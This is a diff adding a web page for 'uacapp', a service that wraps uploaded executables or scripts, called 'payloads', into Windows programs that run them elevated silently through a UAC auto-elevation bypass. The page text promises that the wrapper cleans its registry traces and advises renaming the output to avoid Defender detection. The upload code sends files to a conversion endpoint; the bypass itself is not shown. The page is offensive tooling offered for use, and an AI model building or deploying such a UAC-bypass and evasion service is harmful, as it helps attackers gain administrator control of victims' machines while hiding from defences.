@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>uacapp — payload → elevated app</title>
+<style>
+  :root {
+    --bg: #0a0e14;
+    --panel: #10161f;
+    --panel2: #151d29;
+    --line: #223042;
+    --text: #d7e1ee;
+    --muted: #74839a;
+    --accent: #4f8cff;
+    --accent2: #66ffcc;
+    --danger: #ff5c7a;
+    --mono: "Cascadia Mono", Consolas, "JetBrains Mono", monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: radial-gradient(1200px 600px at 70% -10%, #12203a 0%, var(--bg) 55%) fixed;
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    display: flex; flex-direction: column; align-items: center;
+    padding: 48px 20px 40px;
+  }
+  .wrap { width: min(720px, 100%); }
+  header { margin-bottom: 28px; }
+  h1 { font-size: 26px; font-weight: 700; letter-spacing: 0.5px; }
+  h1 .acc { color: var(--accent); }
+  h1 .acc2 { color: var(--accent2); }
+  p.sub { color: var(--muted); margin-top: 8px; font-size: 13px; line-height: 1.6; }
+  .badge {
+    display: inline-block; margin-top: 12px; padding: 4px 10px;
+    border: 1px solid var(--line); border-radius: 999px;
+    font-size: 11px; color: var(--accent2); background: rgba(102,255,204,.06);
+  }
+  .drop {
+    margin-top: 18px;
+    background: var(--panel); border: 1.5px dashed var(--line);
+    border-radius: 14px; padding: 52px 24px; text-align: center;
+    cursor: pointer; transition: border-color .15s, background .15s, transform .1s;
+    position: relative;
+  }
+  .drop:hover, .drop.over { border-color: var(--accent); background: var(--panel2); }
+  .drop.over { transform: scale(1.01); }
+  .drop .big { font-size: 15px; font-weight: 600; }
+  .drop .small { color: var(--muted); font-size: 12px; margin-top: 10px; line-height: 1.7; }
+  .drop .icon { font-size: 30px; margin-bottom: 14px; opacity: .8; }
+  .drop input[type=file] { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
+  .queue { margin-top: 18px; display: flex; flex-direction: column; gap: 10px; }
+  .item {
+    background: var(--panel); border: 1px solid var(--line); border-radius: 12px;
+    padding: 14px 16px; display: flex; align-items: center; gap: 14px;
+  }
+  .item .name { flex: 1; font-size: 13px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .item .size { color: var(--muted); font-size: 11px; }
+  .item .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--muted); flex-shrink: 0; }
+  .item.ok .dot { background: var(--accent2); }
+  .item.err .dot { background: var(--danger); }
+  .item.err .name { color: var(--danger); }
+  .item .errtext { color: var(--danger); font-size: 11px; }
+  .item.done .download {
+    background: var(--accent2); color: #06251b; text-decoration: none;
+    font-size: 12px; font-weight: 700; padding: 7px 12px; border-radius: 8px;
+  }
+  .bar { height: 4px; margin-top: 12px; border-radius: 2px; overflow: hidden; background: #1b2533; }
+  .bar > div { height: 100%; width: 0; background: linear-gradient(90deg, var(--accent), var(--accent2)); transition: width .2s; }
+  .foot { margin-top: 30px; color: var(--muted); font-size: 11px; line-height: 1.8; text-align: center; }
+  .foot code { background: var(--panel); border: 1px solid var(--line); border-radius: 5px; padding: 1px 6px; color: var(--text); }
+  .samples { margin-top: 8px; }
+  .samples a { color: var(--accent); text-decoration: none; font-size: 12px; }
+  .samples a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <h1><span class="acc">uacapp</span> <span class="acc2">//</span> converted app builder</h1>
+    <p class="sub">
+      Drop a <b>.exe</b>, <b>.bat</b>, <b>.cmd</b>, <b>.ps1</b>, <b>.vbs</b> or <b>.msi</b> payload here and get back a
+      self-contained Windows executable that launches it <b>elevated — silently</b> (Method 61 / slui auto-elevation,
+      no UAC consent prompt). The wrapper cleans its registry machinery and temp files after the payload spawns.
+    </p>
+    <span class="badge" id="status">checking service…</span>
+  </header>
+
+  <div class="drop" id="drop">
+    <div class="icon">⬇</div>
+    <div class="big">drag &amp; drop payload here</div>
+    <div class="small">or click to browse — converted app downloads as <code>&lt;name&gt;_uac.exe</code></div>
+    <input type="file" id="file" />
+  </div>
+
+  <div class="queue" id="queue"></div>
+  <div class="bar" id="bar" style="display:none"><div id="barfill"></div></div>
+
+  <div class="foot">
+    payload is processed in memory, nothing is stored on the server.<br>
+    runs elevated only if the current user is a member of the <b>Administrators</b> group.<br>
+    works on Windows 10 / 11, x64. Defender may behavior-flag the output name — rename per use.
+  </div>
+</div>
+
+<script>
+const drop = document.getElementById('drop');
+const fileEl = document.getElementById('file');
+const queue = document.getElementById('queue');
+const bar = document.getElementById('bar');
+const barfill = document.getElementById('barfill');
+const statusEl = document.getElementById('status');
+
+(async () => {
+  try {
+    const r = await fetch('/api/uac/info');
+    const j = await r.json();
+    statusEl.textContent = 'service ready — base ' + j.base_size_kb + ' KB · ext: ' + j.extensions.join(' ');
+    statusEl.style.color = 'var(--accent2)';
+  } catch (e) {
+    statusEl.textContent = 'service unreachable';
+    statusEl.style.color = 'var(--danger)';
+  }
+})();
+
+function human(n) {
+  if (n < 1024) return n + ' B';
+  if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
+  return (n / 1048576).toFixed(2) + ' MB';
+}
+
+function addItem(name, size) {
+  const el = document.createElement('div');
+  el.className = 'item';
+  el.innerHTML = '<span class="dot"></span><span class="name"></span><span class="size"></span>';
+  el.querySelector('.name').textContent = name;
+  el.querySelector('.size').textContent = human(size);
+  queue.prepend(el);
+  return el;
+}
+
+function convert(file, el) {
+  bar.style.display = 'block';
+  barfill.style.width = '0%';
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', '/api/uac/convert');
+  const fd = new FormData();
+  fd.append('payload', file);
+  xhr.responseType = 'blob';
+  xhr.upload.onprogress = e => {
+    if (e.lengthComputable) barfill.style.width = Math.round((e.loaded / e.total) * 100) + '%';
+  };
+  xhr.onload = () => {
+    bar.style.display = 'none';
+    if (xhr.status === 200) {
+      const ct = xhr.getResponseHeader('Content-Type') || '';
+      let name = file.name.replace(/\.[^.]+$/, '') + '_uac.exe';
+      let disp = xhr.getResponseHeader('Content-Disposition') || '';
+      const m = disp.match(/filename="?([^";]+)"?/);
+      if (m) name = m[1];
+      const url = URL.createObjectURL(xhr.response);
+      const a = document.createElement('a');
+      a.href = url; a.download = name;
+      a.className = 'download'; a.textContent = 'download ' + name;
+      el.classList.add('done');
+      el.appendChild(a);
+      a.click();
+    } else {
+      el.classList.add('err');
+      xhr.response.text().then(t => {
+        let msg = 'convert failed';
+        try { msg = JSON.parse(t).detail || msg; } catch (e) {}
+        const d = document.createElement('div');
+        d.className = 'errtext';
+        d.textContent = msg;
+        el.appendChild(d);
+      });
+    }
+  };
+  xhr.onerror = () => {
+    bar.style.display = 'none';
+    el.classList.add('err');
+    const d = document.createElement('div');
+    d.className = 'errtext';
+    d.textContent = 'network error';
+    el.appendChild(d);
+  };
+  xhr.send(fd);
+}
+
+drop.addEventListener('dragover', e => { e.preventDefault(); drop.classList.add('over'); });
+drop.addEventListener('dragleave', () => drop.classList.remove('over'));
+drop.addEventListener('drop', e => {
+  e.preventDefault();
+  drop.classList.remove('over');
+  for (const f of e.dataTransfer.files) {
+    const el = addItem(f.name, f.size);
+    convert(f, el);
+  }
+});
+fileEl.addEventListener('change', () => {
+  for (const f of fileEl.files) {
+    const el = addItem(f.name, f.size);
+    convert(f, el);
+  }
+  fileEl.value = '';
+});
+</script>
+</body>
+</html>
